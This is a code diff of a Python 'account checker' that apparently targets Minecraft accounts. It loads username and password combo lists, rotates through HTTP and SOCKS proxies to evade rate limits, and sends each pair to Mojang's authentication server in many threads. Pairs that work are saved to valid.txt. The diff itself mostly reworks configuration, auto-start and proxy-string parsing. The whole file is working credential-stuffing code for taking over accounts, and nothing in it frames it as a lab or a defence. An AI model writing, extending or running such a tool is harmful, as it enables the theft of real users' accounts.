@@ -1,14 +1,13 @@
 from utils.colors import yellow, red, green, cyan, blue, white, magenta
-from utils.csetconf import auto_start, check_updates, threads, retries, mail_access, hide_passwords, print_bad, save_bad, proxy_type, proxy_dupe, proxy_bad, debugging, dev_mode
+from utils.csetconf import auto_start, check_updates, threads, retries, mail_access, hide_passwords, print_bad, save_bad, proxy_protocol, proxy_dupe, proxy_bad, debugging, dev_mode
+from utils.mdets import autostart_config
 
+from colorama import Fore, Back, init, Style
 from requests import Session, exceptions
 from traceback import format_exc
 from easygui import fileopenbox
 
-import threading, requests
-import ctypes, time, os,sys
-import keyboard
-import random
+import threading, requests, ctypes, time, os,sys, keyboard, random
 
 class Misc:
     global mark, running, credits
@@ -22,7 +21,6 @@ class Misc:
         version = f.readline()
 
     mark = f'{red}\n' + requests.get('https://pastebin.com/raw/uxJtrC3n').text + f'\n\n{red}  TailsChecker-{version} »» Created by Tails Team\n'
-    running = True
 Misc()
 
 class Main:
@@ -34,7 +32,6 @@ class Main:
         self.invalid = 0
         self.counter = 0
         self.valid = 0
-        self.protocol = None
 
         # Extracted variables
         self.auto_start = auto_start.capitalize()
@@ -45,42 +42,30 @@ class Main:
         self.hide_pwds = hide_passwords.capitalize()
         self.print_bad = print_bad.capitalize()
         self.save_bad = save_bad.capitalize()
-        self.proxy_type = proxy_type
-        self.proxy_dupe = proxy_dupe.capitalize()
-        self.proxy_bad = proxy_bad.capitalize()
+        self.protocol = proxy_protocol
+        self.prox_dupe = proxy_dupe.capitalize()
+        self.prox_bad = proxy_bad.capitalize()
         self.debugging = debugging.capitalize()
         self.dev_mode = dev_mode.capitalize()
 
-        if auto_start == "true":
-            print(f'''
-                {red}> {white}Auto start: {yellow}{auto_start}\n
-                {red}> {white}Check for updates: {yellow}{check_updates}\n
-                {red}> {white}Threads: {yellow}{threads}\n
-                {red}> {white}Retries: {yellow}{threads}\n
-                {red}> {white}Mail access: {yellow}{mail_access}\n
-                {red}> {white}Hide passwords: {yellow}{hide_passwords}\n
-                {red}> {white}print bad accs: {yellow}{print_bad}\n
-                {red}> {white}Save bad accs: {yellow}{save_bad}\n
-                {red}> {white}Proxy: {yellow}{proxy}\n
-                {red}> {white}Proxy type: {yellow}{proxy_type}\n
-                {red}> {white}Proxy duplications: {yellow}{proxy_dupe}\n
-                {red}> {white}Proxy bad: {yellow}{proxy_bad}\n
-                {red}> {white}Debugging: {yellow}{debugging}\n
-                {red}> {white}Dev mode: {yellow}{dev_mode}
-            ''')
-
     def proxy_type(self):
-        print(mark)
-        id = int(input(f"{red}> {white}Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3 [DEFAULT]): "))
-        if id == 1:
-            self.protocol = "https"
-        elif id == 2:
-            self.protocol = "socks4"
-        elif id == 3:
+        try:
+            if auto_start == "true":
+                self.protocol = proxy_protocol
+            else:
+                print(mark)
+                id = int(input(f"{red}> {white}Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3 [DEFAULT]): "))
+                if id == 1:
+                    self.protocol = "https"
+                elif id == 2:
+                    self.protocol = "socks4"
+                elif id == 3:
+                    self.protocol = "socks5"
+                if id < 1 or id > 3:
+                    print(f"{yellow} ERROR {white}: Incorrect value entered, retry.")
+                    exit()
+        except Exception:
             self.protocol = "socks5"
-        if id < 1 or id > 3:
-            print(f"{yellow} ERROR {white}: Incorrect value entered, retry.")
-            exit()
 
     def load_proxies(self):
         print(mark)
@@ -150,80 +135,82 @@ class Main:
 
     
     def check_account(self, username, password):
-        proxy = random.choice(self.proxy_list)
-        if self.protocol == "https":
-            try:
-                if proxy.split(":")[3]:
-                    port = proxy.split(":")
-                    if port[1].isnumeric():
-                        proxy_table = {"http": "http://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1], "https": "https://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1]}
-                    elif port[3].isnumeric():
-                        proxy_table = {"http": "http://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3], "https": "https://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3]}
-            except Exception:
-                proxy_table = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
-        else:
-            try:
-                if proxy.split(":")[3]:
-                    port = proxy.split(":")
-                    if port[1].isnumeric():
-                        proxy_table = {"http": self.protocol + "://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1], "https": self.protocol + "://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1]}
-                    elif port[3].isnumeric():
-                        proxy_table = {"http": self.protocol + "://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3], "https": self.protocol + "://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3]}
-            except Exception:
-                proxy_table = {"http": f"{self.protocol}://{proxy}", "https": f"{self.protocol}://{proxy}"}
-            try:
-                session = self.session()
+        try:
+            proxy = random.choice(self.proxy_list)
+            if self.protocol == "https":
+                try:
+                    if proxy.split(":")[3]:
+                        port = proxy.split(":")
+                        if port[1].isnumeric():
+                            proxy_table = {"http": "http://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1], "https": "https://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1]}
+                        elif port[3].isnumeric():
+                            proxy_table = {"http": "http://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3], "https": "https://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3]}
+                except Exception:
+                    proxy_table = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
+            else:
+                try:
+                    if proxy.split(":")[3]:
+                        port = proxy.split(":")
+                        if port[1].isnumeric():
+                            proxy_table = {"http": self.protocol + "://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1], "https": self.protocol + "://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":" + proxy.split(":")[1]}
+                        elif port[3].isnumeric():
+                            proxy_table = {"http": self.protocol + "://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3], "https": self.protocol + "://" + proxy.split(":")[0] + proxy.split(":")[1] + "@" + proxy.split(":")[2] + ":" + proxy.split(":")[3]}
+                except Exception:
+                    proxy_table = {"http": f"{self.protocol}://{proxy}", "https": f"{self.protocol}://{proxy}"}
+                try:
+                    session = self.session()
 
-                json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
-                check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_table)
+                    json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
+                    check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_table)
 
-                if "accessToken" in check.json():
-                    if self.hide_pwds:
-                        print(f'{green}[Good] {white}{username}:{red}********')
-                    elif self.print_bad == True:
-                        return None
+                    if "accessToken" in check.json():
+                        if hide_pwds == "true":
+                            print(f'{green}[Good] {white}{username}:{red}********')
+                        elif print_bad == "true":
+                            return None
+                        else:
+                            print(f'{red}[Bad] {white}{username}:{password}')
+                    elif "error" in check.json():
+                        if hide_pwds == "true":
+                            print(f'{red}[Bad] {white}{username}:{red}********')
+                        elif print_bad == "true":
+                            return None
+                        else: 
+                            print(f'{red}[Bad] {white}{username}:{password}')
+
+
+                    elif "The request could not be satisfied." in check.content:
+                        print(f'{yellow}[Rate Limited] {white}the request could not be satisfied, removing proxy.')
+                        self.proxy_list.remove(proxy)
+                            
+                    if "clientToken" in check.text:
+                        with open("valid.txt", "a") as f: f.write(f'{username}:{password}\n')
+                        self.valid += 1
+                        self.title()
                     else:
-                        print(f'{red}[Bad] {white}{username}:{password}')
-                elif "error" in check.json():
-                    if self.hide_pwds:
-                        print(f'{red}[Bad] {white}{username}:{red}********')
-                    elif self.print_bad == True:
-                        return None
-                    else: 
-                        print(f'{red}[Bad] {white}{username}:{password}')
-
-
-                elif "The request could not be satisfied." in check.content:
-                    print(f'{yellow}[Rate Limited] {white}the request could not be satisfied, removing proxy.')
-                    self.proxy_list.remove(proxy)
-                        
-                if "clientToken" in check.text:
-                    with open("valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
-                    self.valid += 1
-                    self.title()
-                else:
-                    self.invalid += 1
-                    self.title()
-            except Exception as err:
-                if "No connection could be made because the target machine actively refused it" in str(err):
-                    self.proxy_list.remove(proxy)
-                    # print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
-                    if self.hide_pwds:
-                        print(f'{yellow}[Invalid Proxy] removing {white}=> {pxhidden}')
-                    else:
-                        print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
+                        self.invalid += 1
+                        self.title()
+                except Exception as err:
+                    if "No connection could be made because the target machine actively refused it" in str(err):
+                        self.proxy_list.remove(proxy)
+                        # print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
+                        if self.hide_pwds == "true":
+                            print(f'{red}[Invalid Proxy] {yellow}removing {white}=> ' + f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********')
+                        else:
+                            print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
+        except: pass
 
     def start_checking(self):
-                def thread_starter():
-                    self.check_account(self.usernames[self.counter], self.passwords[self.counter])
+        def thread_starter():
+            self.check_account(self.usernames[self.counter], self.passwords[self.counter])
 
-                while True:
-                    if threading.active_count() <= self.threads:
-                        threading.Thread(target = thread_starter).start()
-                        self.counter += 1
-                    
-                    if self.counter >= len(self.usernames): break
-                input()
+        while True:
+            if threading.active_count() <= self.threads:
+                threading.Thread(target = thread_starter).start()
+                self.counter += 1
+                            
+            if self.counter >= len(self.usernames): break
+        input()
 
     def start(self):
         os.system("cls")
@@ -231,7 +218,7 @@ class Main:
         self.load_proxies()
         self.start_checking()
 
-    def main(self):
+    def updating(self):
         os.system("cls")
         print(mark)
         print(f'{cyan}[INFO]{white}: Checking for updates...', end = "")
@@ -274,11 +261,32 @@ class Main:
             else:
                 return
         else:
-            print(f'{green}[OK]{white}: You are running the latest version.')
+            print(f'{green}[OK]{white}: You are running on the latest version.')
             time.sleep(3)
             os.system("cls")
+
+    def main(self):
+        init()
+        if check_updates == "true":
+            self.updating()
+        else:
+            print(mark)
+            print(f'{red}[Disabled]{yellow} Auto updating, proceeding...')
+            time.sleep(1)
+            os.system("cls")
+
         load_combo = self.load_combos()
         if load_combo is not None:
+            if auto_start == "true":
+                print(mark)
+                self.retries = int(retries)
+                self.threads = int(threads)
+                if hide_passwords == "true":
+                    self.hide = True
+                print(autostart_config + '\n')
+                time.sleep(3)
+                self.start()
+
             print(mark)
             self.threads = int(input(f"{red}> {white}Threads: "))
             os.system("cls")
@@ -286,9 +294,9 @@ class Main:
             try:
                 passwords = int(input(f"{red}> {white}Hide passwords (default: 0 = no, 1 = yes): "))
                 if passwords == 1:
-                    self.hide_pwds = True
+                    self.hide_pwds = "true"
                 else:
-                    self.hide_pwds = False
+                    self.hide_pwds = "false"
             except Exception:
                 passwords = 0
 
